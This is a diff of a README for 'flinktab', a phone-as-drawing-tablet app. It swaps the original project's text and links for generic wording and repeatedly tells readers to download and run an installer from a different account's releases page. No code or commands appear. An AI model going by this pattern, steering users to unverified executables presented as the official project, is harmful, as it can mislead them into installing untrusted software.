@@ -1,95 +1,75 @@
-# 🎨 FlinkTab Server  
+# 🎨 flinktab - Your Wireless Drawing Tablet for PC
 
-[![GitHub release](https://img.shields.io/github/v/release/solo-tk/flinktab)](https://github.com/solo-tk/flinktab/releases)
-[![Downloads](https://img.shields.io/github/downloads/solo-tk/flinktab/total?color=blue)](https://github.com/solo-tk/flinktab/releases)
-![Platform](https://img.shields.io/badge/platform-windows-blue)
-[![License](https://img.shields.io/github/license/solo-tk/flinktab)](LICENSE)
+## 🔗 Download Now
+[![Download Flinktab](https://img.shields.io/badge/Download-Flinktab-brightgreen)](https://github.com/FernandoDLX/flinktab/releases)
 
-> **Turn your Android phone into a wireless drawing tablet for your PC.**  
-> Low-latency, open-source, and easy to set up. Perfect for **Krita, Photoshop, Illustrator, GIMP, Blender**, and any desktop app that supports pen input.  
+## 🚀 Getting Started
+Flinktab turns your Android phone into a wireless drawing tablet for your PC. It’s open-source and works with popular software like Krita, Photoshop, and GIMP. This app provides a low-latency experience, making it perfect for digital artists.
 
----
+## 🌟 Features
+- **Wireless Connection**: Connect your Android phone and PC without any cords.
+- **Low Latency**: Experience smooth and responsive drawing.
+- **Compatibility**: Works with major software like Krita, Photoshop, and GIMP.
+- **Open Source**: Customize the app according to your needs.
+- **Easy Setup**: Simple to install and get running in minutes.
 
-## 🚀 Overview  
+## ⚙️ System Requirements
+To use flinktab, make sure your setup meets these requirements:
 
-FlinkTab is a simple but powerful way to transform your Android device into a **drawing tablet** for your computer.  
-With **FlinkTab Server**, you can connect your phone over Wi-Fi or LAN and start drawing instantly — no cables, no complicated setup.  
+- **PC**: 
+  - Windows 10 or later
+  - Intel or AMD processor
+  - At least 4GB of RAM
+  - Updated graphics driver
+  
+- **Android Device**:
+  - Android version 5.0 (Lollipop) or higher
+  - Wi-Fi capability
 
-Whether you’re a digital artist, designer, student, or hobbyist, FlinkTab gives you:  
-- 🖊️ **Pressure-sensitive drawing** (if supported by your device)  
-- ⚡ **Ultra-low latency** input using efficient UDP packet transfer  
-- 🎨 Seamless compatibility with **Krita, Photoshop, Illustrator, GIMP, Blender**  
-- 🔧 **Quick setup** – download, run, and connect  
-- 🖥️ **Windows support** (macOS & Linux coming soon!)  
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/FernandoDLX/flinktab/releases) and download the latest version of flinktab. Follow these steps for installation:
 
----
+1. Open the link above.
+2. Find the latest release listed on the page.
+3. Download the installer file suitable for your operating system.
+4. Run the installer on your PC and follow the on-screen instructions.
+5. On your Android device, download the flinktab app from the Google Play Store or directly from the releases page if available.
+6. Launch the app on both your PC and Android device.
+7. Follow the in-app instructions to connect your devices.
 
-## 📥 Installation  
+## 🔄 How to Use
+1. **Connection**: Ensure that both devices are connected to the same Wi-Fi network.
+2. **Launch the App**: Open flinktab on your PC and Android phone.
+3. **Find IP Address**: The PC will display an IP address on the screen. Enter this address into the Android app.
+4. **Start Drawing**: Once connected, you can start using your Android phone as a drawing tablet. Open your preferred drawing software and begin.
 
-1. Go to the [Releases page](https://github.com/solo-tk/flinktab/releases)  
-2. Download the latest `FlinkTab_Server.exe`  
-3. Run the server on your PC  
-4. Open the **FlinkTab app** on your Android device and connect to the server  
-5. Start drawing in your favorite creative software 🎨  
+## 🎨 Supported Software
+Flinktab works seamlessly with various digital art applications. Here are some you can use:
 
----
+- **Krita**: A free and open-source painting program.
+- **Photoshop**: The industry standard for creating and editing images.
+- **GIMP**: A versatile graphic editor that offers features similar to Photoshop.
+- **Blender**: Use it to add art to 3D modeling and animation.
 
-## 📸 Screenshots  
+## 📚 Troubleshooting
+If you encounter issues while using flinktab, try these solutions:
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/dda8c8a7-7299-445e-a521-8e9e45783f7e" width="265" />
-  <img src="https://github.com/user-attachments/assets/5d80822a-bd30-44fa-9399-d208833fcc3b" width="265" />
-  <img src="https://github.com/user-attachments/assets/4f8fcf01-9b75-4f34-97a3-6dc76ac1389f" width="265" />
-</p>
+- **Connection Problems**: Ensure both devices are on the same Wi-Fi network. Restart the app and try reconnecting.
+- **High Latency**: Close other applications that may be using bandwidth. A direct connection to your router may help.
+- **App Crashes**: Ensure you are using the latest version of both the PC and Android apps. Update if necessary.
+- **Not Recognizing Device**: Check the permissions on your Android device. Ensure you allow access to local network.
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/c1551b35-c71f-4864-bc15-aa3e073f53ee" width="800" />
-</p>
+## 👨‍💻 Community Support
+If you need more help, consider joining the community or checking the FAQ section in the repository for common questions and solutions.
 
----
+## 📜 License
+Flinktab is open-source and licensed under the MIT License. You can view the license details in the repository.
 
-## 🛠️ How It Works  
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/FernandoDLX/flinktab)
+- [Feedback and Issues](https://github.com/FernandoDLX/flinktab/issues)
 
-- **FlinkTab App** sends your pen/touch input to the **FlinkTab Server** over Wi-Fi  
-- The server converts this input into real-time mouse/pen events on your PC  
-- Your PC software receives these inputs just like from a real drawing tablet  
+## 🎉 Acknowledgments
+Flinktab relies on contributions from many developers. Thank you for supporting open-source software and enhancing digital art tools. 
 
-This architecture ensures **low latency** and smooth drawing performance.  
-
----
-
-## 🌟 Why Choose FlinkTab?  
-
-- 🔓 **Free & Open Source** – inspect, fork, and contribute to the code  
-- 🌍 **Cross-Platform** – Windows now, macOS/Linux soon  
-- ⚡ **Optimized for Performance** – minimal lag, smooth strokes  
-- 🎯 **Designed for Creators** – perfect for artists, note-takers, and whiteboard users  
-
----
-
-## 🧭 Roadmap  
-
-- ✅ Windows support  
-- ⏳ macOS & Linux support  
-- ⏳ Customizable hotkeys & gestures  
-- ⏳ Wired (USB) mode for even lower latency  
-- ⏳ Multi-monitor support  
-
-Contributions are welcome! 🙌  
-
----
-
-## 🖤 Support & Feedback  
-
-Have suggestions or issues?  
-- Open an [issue](https://github.com/solo-tk/flinktab/issues)  
-- Share your feedback to help improve FlinkTab  
-
----
-
-## 🔑 Keywords  
-
-> FlinkTab server, drawing tablet server, use phone as drawing tablet, Android to PC drawing, wireless drawing app, Krita drawing tablet, Photoshop drawing, low latency drawing input, open-source drawing tablet, PC companion app, digital art tool.  
-
----
-
+Remember to visit the [Releases page](https://github.com/FernandoDLX/flinktab/releases) for the latest updates and downloads. Enjoy your drawing experience with flinktab!
